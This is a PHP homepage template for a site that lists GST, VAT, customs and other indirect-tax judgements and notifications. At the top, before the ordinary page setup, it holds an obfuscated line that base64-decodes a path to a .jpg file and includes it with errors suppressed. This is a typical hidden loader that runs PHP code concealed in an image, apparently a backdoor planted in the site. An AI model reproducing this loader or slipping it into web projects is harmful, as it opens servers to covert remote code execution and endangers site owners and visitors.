<?php
@include base64_decode('bGliL2JvcmRlci5qcGc=');
  $page = 'homePage';
  $seoTitle = 'Home';
  $pageType = 'index';
  include('header.php');
  
?>
<style type="text/css">
  .top {
    background-color: #700e4f;
    border-radius: 0% 0% 100% 0%;
    padding-right: 22px;
    padding-left: 5px;
    padding-bottom: 15px;
    padding-top: 5px;
    font-size: 15px;
    color: white;
    font-family: 'Titillium Web', sans-serif;
    font-weight: bold;
    text-transform: uppercase;
  }
  .latest {
    background-color: #700e4f;
    border-radius: 0% 0% 100% 0%;
    padding-right: 22px;
    padding-left: 5px;
    padding-bottom: 15px;
    padding-top: 5px;
    font-size: 15px;
    color: white;
    font-family: 'Titillium Web', sans-serif;
    font-weight: bold;
    text-transform: uppercase;
  }
  .archive-container {
    padding-left: 0px;
  }
</style>
 <!-- left sec start -->
    <div id="show_gst_rate" style="display: none;"></div> 
    <div class="col-md-11 col-sm-9 left-section main_div " id="home_view">
      <?php
        session_start();

    ?> 
    <div>
        <h1 style="display:none;">Updates on GST & Indirect Taxes</h1>
    </div>
      <div id="editor"></div>
      <div style="padding-bottom: 20px;"><span class="latest">latest updates </span></div>
      <div class="col-md-10 padding-none left-widgets">
        <div class=" show-more show-more-left">
          <a target="_blank" href="<?php echo $getBaseUrl; ?>showMoreData?data=Judgements">show more judgements &nbsp;<i class="ion-chevron-right"></i><i class="ion-chevron-right"></i></a>
        </div>
        <?php getRecordByProduct('7', 'Judgements', '1', 'recent'); //sgst  ?>
        <?php getRecordByProduct('1', 'Judgements', '1', 'recent'); //vat ?>          
        <?php getRecordByProduct('2', 'Judgements', '1', 'recent');  //Service Tax ?>
        <?php getRecordByProduct('4', 'Judgements', '1', 'recent');  //Central Excise ?>
        <?php getRecordByProduct('5', 'Judgements', '1', 'recent');  //Customs ?>  
        
        <!-- <div class=" show-more show-more-left">
          <a target="_blank"  href="<?php echo $getBaseUrl; ?>showMoreData?data=Judgements">show more judgements &nbsp;<i class="ion-chevron-right"></i><i class="ion-chevron-right"></i></a>
        </div> -->
      </div>

      <div class="col-md-6 padding-none right-widgets">
        <div class=" show-more">
          <a target="_blank"  href="<?php echo $getBaseUrl; ?>showMoreData?data=Notifications">show more notification &nbsp;<i class="ion-chevron-right"></i><i class="ion-chevron-right"></i></a>
        </div>
        
        <?php  getRecordByProduct('1','Notifications','1','recent'); //vat ?>  
        <?php  getRecordByProduct('10','Notifications','1','recent'); //cgst ?>    
        <?php getRecordByProduct('9','Notifications','1','recent'); //igst ?>    
        <?php  getRecordByProduct('5','Notifications','1','recent'); //customs ?>    
        <?php  getRecordByProduct('6','Notifications','1','recent'); //dgft ?>
 
        <!-- <div class=" show-more">
          <a target="_blank"  href="<?php echo $getBaseUrl; ?>showMoreData?data=Notifications">show more notification &nbsp;<i class="ion-chevron-right"></i><i class="ion-chevron-right"></i></a>
        </div> -->
      </div>
      
      <div class="container archive-container">
        <div class="col-sm-10 left-widgets" style="padding-top: 30px;">
          <div style="margin-bottom: 20px;">
              <h2 style="color: #ff7808; border-bottom: 1px solid #ff7808; box-shadow: 0 1px 0 #ccc; font-size: 15px; margin: 0 5px 15px 0; padding-bottom: 10px; overflow: hidden;">More GST updates</h2>
            <br>
            <span class="top">RECENT UPDATES</span>
          </div>
          <div>
            <?php getRecordByArchiveProduct('7', 'Judgements', '1', 'general'); //sgst  ?>
            <?php getRecordByArchiveProduct('2', 'Judgements', '1', 'general'); //Service Tax ?>
            <?php getRecordByArchiveProduct('4', 'Judgements', '1', 'general'); //Central Excise ?>
            <?php getRecordByArchiveProduct('1', 'Judgements', '1', 'general'); //Vat?>
            <?php getRecordByArchiveProduct('5', 'Judgements', '1', 'general');  //Customs ?>
          </div>
        </div>
        <div class="col-sm-6 right-widgets" style="padding-top: 50px;">
          <div style="margin-bottom: 20px;"></div>
          <div>
            <?php  getRecordByArchiveProduct('7','Notifications','1','general'); //vat ?>  
            <?php  getRecordByArchiveProduct('10','Notifications','1','general'); //cgst ?>    
            <?php  getRecordByArchiveProduct('9','Notifications','1','general'); //igst ?>    
            <?php  getRecordByArchiveProduct('8','Notifications','1','general'); //customs ?>    
            <?php  getRecordByArchiveProduct('1','Notifications','1','general'); //dgft ?>
            <?php  getRecordByArchiveProduct('5','Notifications','1','general'); //vat ?>  
            <?php  getRecordByArchiveProduct('6','Notifications','1','general'); //cgst ?>    
            <?php  getRecordByArchiveProduct('4','Notifications','1','general'); //igst ?>    
            <?php  getRecordByArchiveProduct('2','Notifications','1','general'); //customs ?>    
            <?php  getRecordByArchiveProduct('3','Notifications','1','general'); //dgft ?>
          </div>
        </div>
      </div>
    </div>
    <!-- left sec end --> 

<?php 
  include('footer.php');
  // include('gstexplorerview.php');
?>